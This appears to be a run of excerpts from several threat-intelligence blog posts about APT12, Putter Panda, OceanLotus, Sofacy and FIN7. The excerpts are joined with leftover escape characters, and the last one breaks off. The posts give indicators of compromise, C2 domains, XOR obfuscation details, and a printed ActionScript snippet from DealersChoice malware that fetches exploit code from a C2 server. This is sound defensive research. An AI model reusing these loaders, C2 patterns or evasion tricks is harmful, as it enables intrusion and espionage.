All but one sample that we identified were written to this folder as word.exe. The one outlier was written as winword.exe.\\nResearch into this HIGHTIDE campaign revealed APT12 targeted multiple Taiwanese Government organizations between August 22 and 28.\\nTHREEBYTE Malware Family\\nOn Monday August 25, 2014 we observed a different spear phish email sent from [email\\xa0protected] to a technology company located in Taiwan. This spear phish contained a malicious Word document that exploited CVE-2012-0158. The MD5 of the exploit document was e009b95ff7b69cbbebc538b2c5728b11.\\nSimilar to the newly discovered HIGHTIDE samples documented above, this malicious document dropped a backdoor to C:\\\\DOCUMENTS and SETTINGS\\\\{user}\\\\LOCAL SETTINGS\\\\Temp\\\\word.exe.

Attached to this email was another malicious document that was designed to exploit CVE-2012-0158. This malicious Word document had an MD5 of 499bec15ac83f2c8998f03917b63652e and dropped a backdoor to C:\\\\DOCUMENTS and SETTINGS\\\\{user}\\\\LOCAL SETTINGS\\\\Temp\\\\word.exe. The backdoor had the following properties:\\nMD5\\nf9cfda6062a8ac9e332186a7ec0e706a\\nSize\\n49152 bytes\\nComplie Time\\n2014-08-25 02:10:11\\nImport Hash\\n864cd776c24a3c653fd89899ca32fe0b\\nThe backdoor connects to a command and control server at icc[.]ignorelist[.]com.\\nSimilar to RIPTIDE and HIGHTIDE, the WATERSPOUT backdoor is an HTTP-based backdoor that communicates with its C2 server.\\nGET /<string>/<5 digit number>/<4 character string>.php?<first 3 characters of last string>_id=<43 character string>= HTTP/1.1\\nAccept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)\\nHost: <C2 Location>\\nCache-Control: no-cache\\nFigure 6: Sample GET request for WATERSPOUT backdoor\\nAlthough there are no current infrastructure ties to link this backdoor to APT12, there are several data points that show a possible tie to the same actors:\\nSame initial delivery method (spear phishing email) with a Microsoft Word Document exploiting CVE-2012-0158.\\nThe same “Tran Duy Linh” Microsoft Word Exploit Kit was used in delivery of this backdoor.\\nSimilar Targets were observed where the threat actors utilized this backdoor.\\nJapanese Tech Company\\nTaiwanese Government Organizations\\nOrganizations in the Asia-Pacific Region that are of Interest to China\\nThe WATERSPOUT backdoor was written to the same file path as the HIGHTIDE backdoors:\\nC:\\\\DOCUMENTS and SETTINGS\\\\{user}\\\\LOCAL SETTINGS\\\\Temp\\\\word.exe\\nC:\\\\DOCUMENTS and SETTINGS\\\\{user}\\\\LOCAL SETTINGS\\\\Temp\\\\winword.exe\\nWATERSPOUT was compiled within two days of the last HIGHTIDE backdoor and on the same day as the THREEBYTE backdoor.\\nAPT12 closely monitors online media related to its tools and operations and reacts when its tools are publicly disclosed.\\nAPT12 has the ability to adapt quickly to public exposures with new tools, tactics, and procedures (TTPs).\\nPublic disclosures may result in an immediate change in APT12’s tools. These changes may be temporary and FireEye believes they are aimed at decreasing detection of their tools until a more permanent and effective TTP change can be implemented (e.g., WATERSPOUT).\\nAlthough these points do not definitively tie WATERSPOUT to APT12, they do indicate a possible connection between the WATERSPOUT campaign, the THREEBYTE campaign, and the HIGHTIDE campaign attributed to APT12.\\nConclusion\\nFireEye believes the change from RIPTIDE to HIGHTIDE represents a temporary tool shift to decrease malware detection while APT12 developed a completely new malware toolset. These development efforts may have resulted in the emergence of the WATERSPOUT backdoor.\\nFigure 7: Compile dates for all three malware families\\nAPT12’s adaptations to public disclosures lead FireEye to make several conclusions about this threat group:\\nThough public disclosures resulted in APT12 adaptations, FireEye observed only a brief pause in APT12 activity before the threat actors returned to normal activity levels. Similarly, the public disclosure of APT12’s intrusion at the New York Times also led to only a brief pause in the threat group’s activity and immediate changes in TTPs. The pause and retooling by APT12 was covered in the Mandiant 2014 M-Trends report. Currently, APT12 continues to target organizations and conduct cyber operations using its new tools. Most recently, FireEye observed HIGHTIDE at multiple Taiwan-based organizations and the suspected APT12 WATERSPOUT backdoor at a Japan-based electronics company. We expect that APT12 will continue their trend and evolve and change its tactics to stay ahead of network defenders.\\nNote: IOCs for this campaign can be found here.\\nPrevious Post\\nNext Post\\nPromotion\\nSubscribe\\nShare\\nRecent\\nRSS\\nEmail UpdatesInformation and insight on today's advanced threats from FireEye.\\nShare\\nRecent Posts\\n28 Apr 2020Excelerating Analysis, Part 2 — X[LOOKUP] Gon’ Pivot To Ya\\n27 Apr 2020Putting the Model to Work: Enabling Defenders With Vulnerability\\nIntelligence — Intelligence for Vulnerability Management, Part Four\\n22 Apr 2020Vietnamese Threat Actors APT32 Targeting Wuhan Government and Chinese\\nMinistry of Emergency Management in Latest Example of COVID-19 Related Espionage\\nRSS Feed: Stay Connected\\nCompany\\nWhy FireEye?\\nCustomer Stories\\nCareers\\nCertifications and Compliance\\nInvestor Relations\\nSupplier Documents\\nNews and Events\\nNewsroom\\nPress Releases\\nWebinars\\nEvents\\nAwards and Honors\\nEmail Preferences\\nTechnical Support\\nIncident?\\nReport Security Issue\\nContact Support\\nCustomer Portal\\nCommunities\\nDocumentation Portal\\nFireEye Blogs\\nThreat Research\\nFireEye Stories\\nIndustry Perspectives\\nThreat Map\\nView the Latest Threats\\nContact Us\\n+1 877-347-3393\\nStay Connected\\nLinkedIn\\nTwitter\\nFacebook\\nYouTube\\nPodcast\\nCette page est également disponible en français.\\nVersion française\\nDiese Seite ist auch auf Deutsch verfügbar\\nZur deutschen Seite wechseln\\n日本語ページを\\n見る\\n해당 페이지는 한글 버전으로 보실 수 있습니다\\n바로 가기\\nContinue viewing this page in English\\nCopyright\\xa0©\\xa02020\\xa0FireEye, Inc.\\xa0All rights reserved.\\xa0Privacy & Cookies Policy | Privacy Shield | Legal Documentation\\nSite Language\\nEnglish\\nMy preferred language:\\nEnglish (English)\\nFrench (Français)\\nGerman (Deutsch)\\nJapanese (日本語)\\nKorean (한국어)\\nMore languages\",\n",

Mandiant’s APT1 report was the first to change the game, and paved the way for private security companies to expose advanced threat actors en masse. In the years since, both private security companies and media organizations alike have sought to capitalize on this craze. What is often neglected is reporting on the aftermath of such exposure, and what measures the attackers take to remain hidden, ready to strike again.\\nVery few reports offer follow-ups to what transpires after an attacker is completely pushed out of an environment. If they did, those reports would most likely paint a much bleaker picture of the cyberthreat landscape. The truth is most companies are never aware they’ve been breached again, even if they are hit multiple times after the initial attack. The truth is that intelligent attackers with long-term surveillance goals do not simply give up after their malware and command and control (C2) infrastructure is burned. Attackers typically redesign C2 infrastructure and deploy entirely new or updated malware after being exposed. Unless companies are well positioned to detect these changes, attackers will quietly slip back in time and time again.\\nAt Cylance, we’ve become more interested in following the repercussions of public exposure of so-called advanced threat groups and malware, since this tends to be the new operational norm for security companies. While it’s generally accepted that any exposure of coordinated cyber-espionage is a good thing, we believe it\\'s not clear enough yet whether all the additional public attention is assisting or hindering cyber defenders. Intelligent attackers will adapt, modify tactics, and bolster their operational security in order to survive. We will err on the side of “it\\'s generally better to know more than less”, and will continue to explore the ramifications of public research to attacker activity over the months to come.\\nIn 2014, our colleagues at Crowdstrike wrote an exposé about a long-standing Chinese APT threat group they self-named Putter Panda, which Mandiant/FireEye refers to as APT2. This threat group has been around for quite a while, and commonly operated tangentially to APT1 intrusions into defense contractors and aerospace companies. We\\'ve been tracking a series of exploit documents which, upon successful exploitation, simply drop a file and perform no other actions; these documents have dropped a variety of backdoors associated with a range of previously identified threat groups. One of them was of particular interest because we\\'d never seen the backdoor before and it leveraged a relatively unique German dynamic DNS provider for command and control.\\nThe exploit document was targeted at a Russian speaker with the title \"Гасий Константин Васильевич.doc\", which roughly translates as “Gasy Konstantin”, which seems to be someone’s name. The document itself was a MIME-encoded HTML file which contained a base64-encoded word document as well as an appended XOR-encoded executable. The document exploited CVE-2012-0158 and will decode and write an executable to disk upon infection. The executable began at offset 0x9C50 in the MIME-document and used an encoding mechanism that consisted of an incrementing XOR key, starting at byte 0xAC combined with an additional XOR operation against the byte 0x28, which ultimately yields a unique 256-byte XOR key.\\nDocument Details:\\nFilename: Гасий Константин Васильевич.doc\\nSHA256: 333061e6c4847aa72d3ba241c1df39aa41ce317a3d2898d3d13a5b6eccffc6d9\\nFile Size: 105,552 Bytes\\nAuthor: User123\\nUpon successful exploitation, the backdoor is dropped to \"%USERPROFILE%\\\\Start Menu\\\\Programs\\\\Startup\\\\time.exe\". No other changes to the file system or registry are made. This method achieves persistence but the backdoor will not execute until the user logs off and back into the machine. This functionality alone can assist in the evasion of certain sandbox/dynamic analysis systems. Unless a live human can intervene in the sandboxing process, it would be impossible to observe the post-logoff behavior.\\nBackdoor Details:\\nFilename: %USERPROFILE%\\\\Start Menu\\\\Programs\\\\Startup\\\\time.exe\\nFile Size: 40,960 Bytes\\nSHA256: 523AD50B498BFB5AB688D9B1958C8058F905B634BEFC65E96F9F947E40893E5B\\nCompile Time: 6/2/2015 7:21:08 UTC\\nFilename: Reappraisal_of_India_Tibet_Policy.doc\\nSHA256: 8d98155283c4d8373d2cf2c7b8a79302251a0ce76d227a8a2abdc2a244fc550e\\nFile Size: 71680 bytes\\nAuthor: User\\nFilename: %temp%/kav.exe[2]\\nFile Size: 18944 bytes\\nSHA256: 3d9bd26f5bd5401efa17690357f40054a3d7b438ce8c91367dbf469f0d9bd520\\nCompile Time: 3/7/2014 06:38:37 UTC\\nThe above sample (kav.exe/wizard.exe) leverages sys.firewall-gateway.net for C2.\\nThe German dynamic DNS provider supplies a number of free secondary domains for public use that network defenders should be on the lookout for, including:\\n*.firewall-gateway.com\\n*.firewall-gateway.de\\n*.firewall-gateway.net\\n*.kustomize.de\\n*.medical-dns.de\\n*.myfirewall.org\\n*.my-firewall.org\\n*.my-gateway.de\\n*.my-router.de\\n*.pptp.de\\n*.spdns.de\\n*.spdns.eu\\n*.spdns.org\\n*.spnoc.de\\nCurrent dynamic command and control infrastructure for these campaigns rely heavily upon the following domains and IP addresses:\\nDomains:\\naccounts-google.firewall-gateway.com\\nadmin.spdns.org\\ncreatnimei.dyndns-wiki.com\\ndetail43.myfirewall.org\\ndocs.google.com.publicvm.com\\neconomy.spdns.de\\neconomy.spdns.eu\\nextension.spdns.org\\nfirefox.spdns.de\\nfirewallupdate.firewall-gateway.net\\nintersecurity.firewall-gateway.com\\njdk.spdns.eu\\nkaspersky.firewall-gateway.net\\nkissecurity.firewall-gateway.net\\nnews.firewall-gateway.com\\nopero.spdns.org\\nsys.firewall-gateway.com\\nsys.firewall-gateway.net\\ntally.myfirewall.org\\nzuni.spdns.org\\nIP Addresses:\\n78.129.252.159\\n87.117.229.26\\n109.169.86.25\\nConclusion\\nIt’s dangerous to develop a sense of “research malaise” when approaching piles of samples and the seemingly endless supply of malware we see and tear apart every day. Our many investigations have made us well aware that many regional threat actors employ, share, and recycle tools, techniques, and other identifiable bits of their tradecraft. Whether we refer to them as furry animals, numerals, or any other moniker, our investigations revealed a great deal of repetition. That being said, we know we must continue to be vigilant, considering the alarming fact that many of these known, familiar, and old techniques are still highly successful. Well-documented exploits from 2012 and 2013 are still working very effectively for these actors. Many of these antiquated exploits are still being used to deliver malware that is 100% undetected by the current AV industry, even though that industry continues to pat itself on the back for a job well done.\\nOne of the goals of Cylance’s SPEAR Team™ is to break down these “old” threats, reveal continued exposure to them, and demonstrate the value of thinking about countermeasures in a new way.\\nNOTE: These samples presented no problem for CylancePROTECT®:\\nBelieve the math!!\\n[1] http://community.websense.com/blogs/securitylabs/archive/2013/08/15/tibetan-compromise.aspx\\n[2] Variations named “wizard.exe” are also commonly observed\\nThe backdoor utilizes a few simple checks to ensure that Kaspersky products are not installed on the system, via a simple registry check looking for the key \"HKLM\\\\Software\\\\KasperskyLab\", as well as scanning running processes for a process named \"avp.exe\".\\nIf both checks pass, the backdoor calls the API function SetTimer with a 10 second timeout. Once the timer elapses, a notification function is called. This notification function kills the timer and calls CreateThread with the start address of the backdoor code. The backdoor code is initially obfuscated by a single byte XOR against 0x61 where every even byte is skipped; control is then transferred to the second stage, which decrypts itself further using a single byte XOR with 0xB1. The backdoor will create an event named \"Mi++(:v\" and communicates to \"aa123.spdns.de\" on TCP port 8083.\\nAt the time of this report, aa123.spdns.de resolved to \"192.253.253.22\".

This process involves some trickery commonly associated with targeted operations of this kind.\\nESET researchers have dissected some of the latest additions to the malicious toolkit of the Advanced Persistent Threat (APT) group known as OceanLotus, also dubbed APT32 and APT-C-00.\\nA prolific purveyor of malware, OceanLotus has its sights set on high-profile corporate and government targets in Southeast Asia, particularly in Vietnam, the Philippines, Laos, and Cambodia. The apparently well-resourced and determined group, is known for integrating its custom-built creations with techniques long known to be successful.\\nOceanLotus certainly isn’t resting on its laurels while pursuing its goals that include cyberespionage, reconnaissance and intellectual property theft. One of the group’s latest backdoors is a fully-fledged malicious tool that gives its operators remote access to a compromised machine. The backdoor contains a suite of functionalities, notably a number of tools for file, registry and process manipulation, as well as the loading of additional components.\\nTo smuggle the backdoor onto a targeted machine, the group uses a two-stage attack whereby a dropper package first gains a foothold on the system and sets the stage for the backdoor itself. This process involves some trickery commonly associated with targeted operations of this kind.\\nThe ruse\\nThe attack typically begins with an attempt – most probably via a spearphishing email – to lure the intended victim into running the malicious dropper, which is attached to the email. In order to increase the likelihood that the unsuspecting victim will actually click on it, the malicious executable masquerades as a document or spreadsheet by displaying a fake icon.\\nWhen the victim clicks on the attachment, the dropper opens a password-protected document that is intended as a ‘red herring’ to divert the victim’s attention while the dropper goes about its nefarious business. No software exploits are needed.\\nThe attackers use a number of decoy documents. To boost its aura of authenticity, each file has a rather carefully crafted – and usually English – name. ESET detects the files as Win32/TrojanDropper.Agent.RUI.\\nIn addition, OceanLotus is also known to use ‘watering hole attacks’, which involve the compromise of a website that the victim is likely to visit. In this scenario, the ‘prey’ is tricked into downloading and executing a fake installer or fake update for popular software from the booby-trapped website. Whatever the method of compromise, ultimately the same backdoor is deployed.\\nThe watering hole technique has probably been used to distribute a dropper called RobototFontUpdate.exe, which is a fake updater for the Roboto Slab regular font and features in our analysis below.\\nUnder the hood\\nFigure 1. Dropper execution flow\\nThe components of the dropper package are executed in a number of steps; each stage involves a heavy dose of code obfuscation that is designed to shield the malware from detection. To lead researchers and anti-malware software further astray, some garbage code is also included.\\nIf run with administrator privileges, the dropper creates a Windows service that establishes persistence on the system (so that the malware will survive a reboot). Otherwise, the same goal is achieved by tampering with the operating system’s registry.\\nIn addition, the package drops an application whose sole purpose is to delete the ‘lure document’ once it fulfills its mission.\\nFigure 2. Backdoor execution flow\\nImportantly, two more files are dropped and come into play during this stage – a digitally-signed executable from a major, legitimate software developer and a malicious Dynamic Link Library (DLL) named after one used by the legitimate executable.\\nThe two files figure in a tried-and-tested trick called ‘DLL side-loading’, which consists in co-opting a legitimate application’s library-loading process by planting a malicious DLL inside the same folder as the signed executable. This is a way to remain under the radar, since a trusted application with a valid signature is less likely to arouse suspicion.\\nIn campaigns utilizing these new OceanLotus tools, we have seen deployed, among others, the genuine signed executables RasTlsc.exe from Symantec and mcoemcpy.exe from McAfee. When run, these programs call, respectively, the maliciously supplied rastls.dll (detected by ESET as Win32/Salgorea.BD) and McUtil.dll (detected as Win32/Korplug.MK).\\nFigure 3. Symantec rastlsc.exe digital signature\\nThe backdoor opens\\nOnce decrypted, the backdoor takes a fingerprint of the system. It sends home various data, such as the computer and user names and the operating system version, before waiting for commands to carry out its main mission.\\nA number of domain names and IP addresses are used for the command-and-control (C&C) infrastructure. All communication with the C&C servers is encrypted. It can be readily unscrambled, however, as the decryption key is prepended to the data.\\nOur deep dive (see the link below) into OceanLotus’s latest marauding campaigns shows that the group isn’t letting up in its efforts and combines legitimate code and publicly available tools with its own harmful creations. The group clearly goes to great lengths in order to bypass detection for its malware and, ultimately, to ‘muddy the waters’ for researchers.\\nA detailed analysis may be read in the white paper: OceanLotus: Old techniques, new backdoor\\nTomáš Foltýn 13 Mar 2018 - 09:55AM\\nSimilar Articles\\nMalware\\nGrandoreiro: How engorged can an EXE get?\\nMalware\\nFollowing ESET’s discovery, a\\xa0Monero mining botnet is disrupted\\nMalware\\nStantinko’s new cryptominer features unique obfuscation techniques\\nMalware\\nTracking Turla: New backdoor delivered via Armenian watering holes\\nDiscussion\\nHome\\nAbout Us\\nContact Us\\nSitemap\\nOur Experts\\nESET\\nResearch\\nHow To\\nCategories\\nRSS Configurator\\nNews Widget\\nPrivacy policy\\nLegal Information\\nCopyright © ESET, All Rights Reserved\\nBack to top',\n",

The attack consisted of Microsoft Word delivery documents that contained Adobe Flash objects capable of loading additional malicious Flash objects embedded in the file or directly provided by a command and control server. Sofacy continued to use DealersChoice throughout the fall of 2016, which we also documented in our December 2016 publication discussing Sofacy’s larger campaign.\\nOn March 12\\xa0and March 14, we observed the Sofacy group carrying out an attack on a European government agency involving an updated variant of DealersChoice. The updated DealersChoice documents used a similar process to obtain a malicious Flash object from a C2 server, but the inner mechanics of the Flash object contained significant differences in comparison to the original samples we analyzed.\\nOne of the differences was a particularly clever evasion technique: to our knowledge this has never been observed in use. With the previous iterations of DealersChoice samples, the Flash object would immediately load and begin malicious tasks. In the March attacks, the Flash object is only loaded if the user scrolls through the entire content of the delivery document and views the specific page the Flash object is embedded on. Also, DealersChoice requires multiple interactions with an active C2 server to successfully exploit an end system.\\nThe overall process to result in a successful exploitation is:\\nUser must open the Microsoft Word email attachment\\nUser must scroll to page three of the document, which will run the DealersChoice Flash object\\nThe Flash object must contact an active C2 server to download an additional Flash object containing exploit code\\nThe initial Flash object must contact the same C2 server to download a secondary payload\\nVictim host must have a vulnerable version of Flash installed\\nThe Attack\\nThe attack involving this updated variant of DealersChoice was targeting a European government organization. The attack relied on a spear-phishing email with a subject of “Defence & Security 2018 Conference Agenda” that had an attachment with a filename of “Defence & Security 2018 Conference Agenda.docx”. The attached document contains a conference agenda that the Sofacy group appears to have copied directly from the website for the “Underwater Defence & Security 2018 Conference” here.\\nOpening the attached “Defence & Security 2018 Conference Agenda.docx” file does not immediately run malicious code to exploit the system. Instead, the user must scroll to the third page of the document, which will load a Flash object that contains ActionScript that will attempt to exploit the user’s system to install a malicious payload. The Flash object embedded within this delivery document is a variant of an exploit tool that we call DealersChoice. This suggests that the Sofacy group is confident that the targeted individuals would be interested enough in the content to peruse through it.\\nWe analyzed the document to determine the reason that the malicious Flash object only ran when the user scrolled to the third page. According to the document.xml file, the DealersChoice loader SWF exists after the “covert-shores-small.png” image file within the delivery document. This image file exists on the third page of the document, so the user would have to scroll down in the document to this third page to get the SWF file to run. The user may not notice the Flash object on the page, as Word displays it as a tiny black box in the document, as seen in Figure 1. This is an interesting anti-sandbox technique, as it requires human interaction prior to the document exhibiting any malicious activity.\\nFigure 1 Flash object appearing as a small black box in delivery document\\nUpdated DealersChoice\\nThis DealersChoice Flash object shares a similar process to previous variants; however, it appears that the Sofacy actors have made slight changes to its internal code. Also, it appears that the actors used ActionScript from an open source video player called “f4player”, which is freely available on GitHub with the following description:\\nf4Player is an open source flash (AS3) video player and library project. It is so small that it is only 10kb (with skin file) and totally free under GPL license.\\nThe Sofacy developer modified the f4player’s ActionScript to include additional code to load an embedded Flash object. The additions include code to decrypt an embedded Flash object and an event handler that calls a newly added function (“skinEvent2”) that plays the decrypted object, as seen in the code snippet below:\\nvar skinEvent2:Function = function(param1:Event):void\\n{\\nskin2 = param1.currentTarget.content;\\nstage.addChild(skin2);\\nskin2.play(\"hxxp://ndpmedia24[.]com/0pq6m4f.m3u8\");\\n};\\nvar mov:Loader = new Loader();\\nmov.contentLoaderInfo.addEventListener(Event.COMPLETE,skinEvent2);\\nvar b:ByteArray = new this.Mov();\\nvar k:uint = 82;\\nvar i:uint = 4;\\nwhile(i < b.length)\\n{\\nb[i] = b[i] ^ k;\\ni++;\\n}\\nmov.loadBytes(b);\\n1234567891011121314151617\\nvar skinEvent2:Function = function(param1:Event):void {\\xa0\\xa0\\xa0\\xa0skin2 = param1.currentTarget.content;\\xa0\\xa0\\xa0\\xa0stage.addChild(skin2);\\xa0\\xa0\\xa0\\xa0skin2.play(\"hxxp://ndpmedia24[.]com/0pq6m4f.m3u8\"); }; var mov:Loader = new Loader(); mov.contentLoaderInfo.addEventListener(Event.COMPLETE,skinEvent2); var b:ByteArray = new this.Mov(); var k:uint = 82; var i:uint = 4; while(i < b.length) {\\xa0\\xa0\\xa0\\xa0b[i] = b[i] ^ k;\\xa0\\xa0\\xa0\\xa0i++; } mov.loadBytes(b);\\nThe above code allows DealersChoice to load a second SWF object, specifically loading it with an argument that includes a C2 URL of “hxxp://ndpmedia24[.]com/0pq6m4f.m3u8”.\\nThe embedded SWF extracts the domain from the C2 URL passed to it and uses it to craft a URL to get the server’s ‘crossdomain.xml’ file in order to obtain permissions to load additional Flash objects from the C2 domain. The ActionScript relies on event listeners to call specific functions when the event “Event.COMPLETE” is triggered after successful HTTP requests are issued to the C2 server. The event handlers call functions with the following names, which includes an incrementing number that represents the order in which the functions are called:\\nonload1\\nonload2\\nonload3\\nonload5\\nWith these event handlers created, the ActionScript starts by gathering system data from the flash.system.Capabilities.serverString property (just like in the original DealersChoice.B samples) and issues an HTTP GET with the system data as a parameter to the C2 URL that was passed as an argument to the embedded SWF when it was initially loaded. When this HTTP request completes, the event listener will call the ‘onload1’ function.\\nThe ‘onload1’ function parses the response data from the request to the C2 URL using regular expressions. According to the following code snippet, it appears the regular expression is looking for a hexadecimal string after “/” and before “/sec”, as well as any string between “/hls/” and “/tracks”:\\nvar data:String = e.target.data;\\nvar p1:RegExp = /\\\\/([0-9a-f]+)\\\\/sec/gim;\\nr1 = p1.exec(data);\\nvar r2:Array = p1.exec(data);\\nvar p2:RegExp = /\\\\/hls\\\\/(.+)\\\\/tracks/gim;\\nvar r3:Array = p2.exec(data);\\nr4 = p2.exec(data);\\n1234567\\nvar data:String = e.target.data;var p1:RegExp = /\\\\/([0-9a-f]+)\\\\/sec/gim;r1 = p1.exec(data);var r2:Array = p1.exec(data);var p2:RegExp = /\\\\/hls\\\\/(.+)\\\\/tracks/gim;var r3:Array = p2.exec(data);r4 = p2.exec(data);\\nThe regular expressions suggest that the C2 server responds with content that is meant to resemble HTTP Live Steaming (HLS) traffic, which is a protocol that uses HTTP to deliver audio and video files for streaming. The use of HLS coincides with the use of ActionScript code from the f4player to make the traffic seem legitimate. The variables storing the results of the regular expression matches are used within the ActionScript for further interaction with the C2 server. The following is a list of these variables and their purpose:\\nVariable\\nPurpose\\nr1\\nUsed as the decryption key for the downloaded SWF file. This will be a 16-byte hexadecimal string.\\nr2\\nNot used.\\nr3\\nUsed as the URL within the HTTP request within onload1 function, specifically as the URL to get the malicious SWF file to exploit the system.\\nr4\\nUsed as the URL within the HTTP request within onload2 function, specifically as the URL to get the payload to run after successful exploitation of the system.\\nThe ‘onload1’ function then sends an HTTP GET request to the C2 domain using the value stored in the ‘r3’ variable as a URL. When this HTTP request completes, the event listener will call the ‘onload2’ function.\\nThe ‘onload2’ function decrypts the response received from the HTTP request issued in ‘onload1’ function. It does so by calling a sub-function to decrypt the content, using the value stored in the ‘r1’ variable as a key. The sub-function to decrypt the content skips the first 4 bytes, suggesting that the first four bytes of the downloaded content is in cleartext (most likely the “FWS” or “CWS” header to look legitimate).\\nAfter decrypting the content, the ‘onload2’ function will issue another HTTP GET request with the system data as a parameter, but this time to the C2 using a URL from the ‘r4’ variable. When this request completes, the event listener will call the ‘onload3’ function.\\nThe ‘onload3’ function will take the response to the HTTP request in ‘onload2’ and treat it as the payload. The ActionScript will read each byte of the C2 response and get the hexadecimal value of each byte and create a text array of 4-byte hexadecimal values with “0x” prepended and “,” appended to each using the following code:\\nsh = she + (\"0x\" + hex.substr(i + 6,2) + hex.substr(i + 4,2) + hex.substr(i + 2,2) + hex.substr(i,2) + \",\");\\n1\\nsh = she + (\"0x\" + hex.substr(i + 6,2) + hex.substr(i + 4,2) + hex.substr(i + 2,2) + hex.substr(i,2) + \",\");\\nThis hexadecimal string will most likely be a string of shellcode that will contain and decrypt the ultimate portable executable (PE) payload. The string of comma separated hexadecimal values is passed as a parameter when loading the SWF file downloaded in ‘onload2’. This function creates an event listener for when the SWF file is successfully loaded, which will call the ‘onload5’ function.\\nThe ‘onload5’ function is responsible for adding the newly loaded SWF object as a child object to the current running object using the following code:\\nstage.addChild(param1.currentTarget.content);\\n1\\nstage.addChild(param1.currentTarget.content);\\nThis loads the SWF file, effectively running the malicious code on the system. During our analysis, we were unable to coerce the C2 into providing a malicious SWF or payload. As mentioned in our previous blogs on DealersChoice, the payload of choice for previous variants was SofacyCarberp (Seduploader), but we have no evidence to suggest this tool was used in this attack. We are actively researching and will update this blog in the event we discover the malicious Flash object and payload delivered in this attack.\\nLinkage to Prior Campaign\\nThe delivery document used in this attack was last modified by a user named ‘Nick Daemoji’, which provides a linkage to previous Sofacy related delivery documents. The previous documents that used this user name were macro-laden delivery documents that installed SofacyCarberp/Seduploader payloads, as discussed in Talos’ blog. This overlap also points to a similar social engineering theme between these two campaigns, as both used content from upcoming military and defense conferences as a lure.\\nConclusion\\nThe Sofacy threat group continues to use their DealersChoice framework to exploit Flash vulnerabilities in their attack campaigns. In the most recent variant, Sofacy modified the internals of the malicious scripts, but continues to follow the same process used by previous variants by obtaining a malicious Flash object and payload directly from the C2 server. Unlike previous samples, this DealersChoice used a DOCX delivery document that required the user to scroll through the document to trigger the malicious Flash object. The required user interaction turned out to be an interesting anti-sandbox technique that we had not seen this group perform in the past.\\nIndicators of Compromise\\nDealersChoice\\n0cd9ac328d858d8d83c9eb73bfdc59a958873b3d71b24c888d7408d9512a41d7 (Defence & Security 2018 Conference Agenda.docx)\\nndpmedia24[.]com\\nMacro-ladened documents\\ne5511b22245e26a003923ba476d7c36029939b2d1936e17a9b35b396467179ae\\nefb235776851502672dba5ef45d96cc65cb9ebba1b49949393a6a85b9c822f52\\nc4be15f9ccfecf7a463f3b1d4a17e7b4f95de939e057662c3f97b52f7fa3c52f\\nGet updates from\\nPalo Alto Networks!\\nSign up to receive the latest news, cyber threat intelligence and research from us\\nPlease enter your email address!\\nPlease mark, I\\'m not a robot!\\nBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.\\nPopular ResourcesResource Center\\nBlog\\nCommunities\\nTech Docs\\nUnit 42\\nSitemap\\nLegal NoticesPrivacy\\nTerms of Use\\nDocuments\\nAccountManage Subscriptions\\nReport a Vulnerability\\n© 2020 Palo Alto Networks, Inc.

Félix Aime\\non May 8, 2019. 10:00 am\\nOn August 1, 2018, the US Department of Justice announced that it had arrested several individuals suspected of having ties to the FIN7 cybercrime rig. FIN7 operations are linked to numerous intrusion attempts having targeted hundreds of companies since at least as early as 2015. Interestingly, this threat actor created fake companies in order to hire remote pentesters, developers and interpreters to participate in their malicious business. The main goal behind its malicious activities was to steal financial assets from companies, such as debit cards, or get access to financial data or computers of finance department employees in order to conduct wire transfers to offshore accounts.\\nIn 2018-2019, researchers of Kaspersky Lab’s Global Research and Analysis Team analyzed various campaigns that used the same Tactics Tools and Procedures (TTPs) as the historic FIN7, leading the researchers to believe that this threat actor had remained active despite the 2018 arrests. In addition, during the investigation, we discovered certain similarities to other attacker groups that seemed to share or copy the FIN7 TTPs in their own operations.\\nRecent FIN7 campaigns\\nThe FIN7 intrusion set continued its tailored spear phishing campaigns throughout last year. Kaspersky Lab has been able to retrieve some of these exchanges from a FIN7 target. The spear phishing campaigns were remarkably sophisticated from a social engineering perspective. In various cases, the operators exchanged numerous messages with their victims for weeks before sending their malicious documents. The emails were efficient social-engineering attempts that appealed to a vast number of human emotions (fear, stress, anger, etc.) to elicit a response from their victims. One of the domains used by the attackers in their 2018 campaign of spear phishing contained more than 130 email aliases, leading us to think that more than 130 companies had been targeted by the end of 2018.\\nMalicious Documents\\nWe have seen two types of documents sent to victims in these spear phishing campaigns. The first one exploits the INCLUDEPICTURE feature of Microsoft Word to get context information about the victim’s computer, and the availability and version number of Microsoft Word. The second one, which in many cases is an Office document protected with a trivial password, such as “12345”, “1234”, etc., uses macros to execute a GRIFFON implant on the target’s computer. In various cases, the associated macro also scheduled tasks to make GRIFFON persistent.\\nInterestingly, following some open-source publications about them, the FIN7 operators seems to have developed a homemade builder of malicious Office document using ideas from ThreadKit, which they employed during the summer of 2018. The new builder inserts random values in the Author and Company metadata fields. Moreover, the builder allows these to modify different IOCs, such as the filenames of wscript.exe or sctasks.exe copies, etc.\\nwscript.exe copy\\nsctasks copy\\nTask name\\nC2\\nbyzNne10.exe\\nbyzNne17.exe\\nTaskbyzNne\\nlogitech-cdn.com\\nc9FGG10.exe\\nc9FGG17.exe\\nTaskc9FGG\\nlogitech-cdn.com\\nzEsb10.exe\\nzEsb17.exe\\nTaskzEsb\\nservicebing-cdn.com\\nIOCs extracted from docs which use sctasks for GRIFFON persistence\\nAuthor\\nCompany\\nwscript.exe copy\\nC2\\nmogjxjtvte\\nmogjxjtvte\\nmswmex44.exe\\nlogitech-cdn[.]com\\nsoxvremvge\\nsoxvremvge\\nc9FGG10.exe\\nlogitech-cdn[.]com\\ngareljtjhvd\\ngareljtjhvd\\nzEsb10.exe\\nservicebing-cdn[.]com\\nIOCs extracted from regular documents associated to GRIFFON\\nGRIFFON Implant\\nGriffon Malware attack pattern\\nThe GRIFFON implant is a lightweight JScript validator-style implant without any persistence mechanism. The malware is designed for receiving modules to be executed in-memory and sending the results to C2s. We were able to obtain four different modules during the investigation.\\nReconnaissance module\\nThe first module downloaded by the GRIFFON malware to the victim’s computer is an information-gathering JScript, which allows the cybercriminals to understand the context of the infected workstation. This module mainly relies on WMI and Windows objects to deliver results, which will be sent back to the operators. Interestingly, more than 20 artifacts are retrieved from the system by this implant during the reconnaissance stage, from the date and time of operating system installation and membership in a Windows domain to a list of and the resolutions of the workstation’s monitors.\\nMeterpreter 